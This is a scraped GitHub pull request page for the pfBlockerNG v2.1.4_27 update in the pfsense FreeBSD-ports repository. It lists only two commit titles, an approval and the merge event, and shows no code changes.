   472](/login?return_to=%2Fpfsense%2FFreeBSD-ports)

* [Code](/pfsense/FreeBSD-ports)
* [Pull requests
  25](/pfsense/FreeBSD-ports/pulls)
* [Actions](/pfsense/FreeBSD-ports/actions)
* [Projects
  0](/pfsense/FreeBSD-ports/projects)
* [Security](/pfsense/FreeBSD-ports/security)
* [Insights](/pfsense/FreeBSD-ports/pulse)

Additional navigation options

* [Code](/pfsense/FreeBSD-ports)
* [Pull requests](/pfsense/FreeBSD-ports/pulls)
* [Actions](/pfsense/FreeBSD-ports/actions)
* [Projects](/pfsense/FreeBSD-ports/projects)
* [Security](/pfsense/FreeBSD-ports/security)
* [Insights](/pfsense/FreeBSD-ports/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fpfsense%2FFreeBSD-ports%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fpfsense%2FFreeBSD-ports%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# pfBlockerNG v2.1.4\_27 #1169

 Merged

[netgate-git-updates](/netgate-git-updates)
merged 2 commits into
[pfsense:devel](/pfsense/FreeBSD-ports/tree/devel "pfsense/FreeBSD-ports:devel")
from
BBcan177:patch-1

Jun 5, 2022

 Merged

# [pfBlockerNG v2.1.4\_27](#top) #1169

[netgate-git-updates](/netgate-git-updates)
merged 2 commits into
[pfsense:devel](/pfsense/FreeBSD-ports/tree/devel "pfsense/FreeBSD-ports:devel")
from
BBcan177:patch-1

Jun 5, 2022

[Conversation
0](/pfsense/FreeBSD-ports/pull/1169)
[Commits
2](/pfsense/FreeBSD-ports/pull/1169/commits)
[Checks
0](/pfsense/FreeBSD-ports/pull/1169/checks)
[Files changed](/pfsense/FreeBSD-ports/pull/1169/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![BBcan177](https://avatars.githubusercontent.com/u/6877949?s=60&v=4)](/BBcan177)

Copy link

Contributor

### @BBcan177 **[BBcan177](/BBcan177)** commented [Jun 5, 2022](#issue-1261113848)

 *No description provided.*

Sorry, something went wrong.

All reactions

 [BBcan177](/BBcan177)
added 2 commits
[June 5, 2022 13:25](#commits-pushed-071bdcf)

[![@BBcan177](https://avatars.githubusercontent.com/u/6877949?s=40&v=4)](/BBcan177)

`[Update index.php](/pfsense/FreeBSD-ports/pull/1169/commits/071bdcf2d918c3e51cde11cf81fbd9b6f0379d7e "Update index.php")`

`[071bdcf](/pfsense/FreeBSD-ports/pull/1169/commits/071bdcf2d918c3e51cde11cf81fbd9b6f0379d7e)`

[![@BBcan177](https://avatars.githubusercontent.com/u/6877949?s=40&v=4)](/BBcan177)

`[Update Makefile](/pfsense/FreeBSD-ports/pull/1169/commits/74186894fdb710a61598f2c6822ae0a3b5566396 "Update Makefile")`

`[7418689](/pfsense/FreeBSD-ports/pull/1169/commits/74186894fdb710a61598f2c6822ae0a3b5566396)`

[![jim-p](https://avatars.githubusercontent.com/u/174434?s=60&v=4)](/jim-p)

**[jim-p](/jim-p)**
approved these changes
[Jun 5, 2022](#pullrequestreview-996027730)

 [View reviewed changes](/pfsense/FreeBSD-ports/pull/1169/files/74186894fdb710a61598f2c6822ae0a3b5566396)

[![@netgate-git-updates](https://avatars.githubusercontent.com/u/7121082?s=40&u=7d8e6980471742d28fbf7c175dc764854e766d15&v=4)](/netgate-git-updates)
[netgate-git-updates](/netgate-git-updates)
merged commit [`5950774`](/pfsense/FreeBSD-ports/commit/59507746d51f56d181a34a5b9681aa314d8c64a5)
into
pfsense:devel

[Jun 5, 2022](https://github.com/pfsense/FreeBSD-ports/pull/1169#event-6745937720)

 [![@BBcan177](https://avatars.githubusercontent.com/u/6877949?s=40&u=ffe6eec46f9470b2b096c4d5534caca73081a12b&v=4)](/BBcan177)
[BBcan177](/BBcan177)
deleted the
patch-1

branch
[June 5, 2022 18:16](#event-6746101742)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fpfsense%2FFreeBSD-ports%2Fpull%2F1169)

Reviewers

[![@jim-p](https://avatars.githubusercontent.com/u/174434?s=40&v=4)](/jim-p) [jim-p](/jim-p)

jim-p approved these changes

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@BBcan177](https://avatars.githubusercontent.com/u/6877949?s=52&v=4)](/BBcan177) [![@jim-p](https://avatars.githubusercontent.com/u/174434?s=52&v=4)](/jim-p) [![@netgate-git-updates](https://avatars.githubusercontent.com/u/7121082?s=52&v=4)](/netgate-git-updates)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


